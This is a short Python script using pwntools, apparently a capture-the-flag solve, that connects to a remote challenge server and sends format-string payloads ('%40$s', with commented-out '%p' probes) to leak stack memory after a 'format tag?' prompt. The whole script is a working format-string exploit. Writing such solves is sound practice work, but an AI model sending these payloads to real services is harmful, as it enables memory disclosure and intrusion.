from pwn import *

r = remote("rivit.dev", 10003)
r.recvuntil("format tag? ")
#payload = b'%8$p' + b'%9$p' + b'%10$p' + b'%11$p' + b'%12$p' + b'%13$p'
payload = b"%40$s"
r.sendline(payload)

r.interactive()